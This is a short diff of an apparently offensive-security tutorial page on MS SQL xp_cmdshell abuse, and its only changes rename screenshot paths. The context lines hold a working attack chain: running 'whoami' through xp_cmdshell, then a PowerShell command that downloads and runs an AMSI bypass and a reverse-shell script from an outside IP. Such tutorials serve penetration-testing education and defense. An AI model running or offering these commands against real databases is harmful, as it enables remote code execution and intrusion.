@@ -29,7 +29,7 @@ RECONFIGURE
 EXEC master..xp_cmdshell 'whoami'
 ```
 
-![](<../../../.gitbook/assets/image (60).png>)
+![](<../../../.gitbook/assets/image (60) (1).png>)
 
 3\. Gain a reverse shell and execute commands
 
@@ -37,7 +37,7 @@ EXEC master..xp_cmdshell 'whoami'
 EXEC master..xp_cmdshell 'powershell iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/amsi.txt''); iex (New-Object Net.WebClient).DownloadString(''http://192.168.248.3:8090/Invoke-PowerShellTcp2.ps1'')"'
 ```
 
-![](<../../../.gitbook/assets/image (45).png>)
+![](<../../../.gitbook/assets/image (45) (1).png>)
 
 ## Defending
 
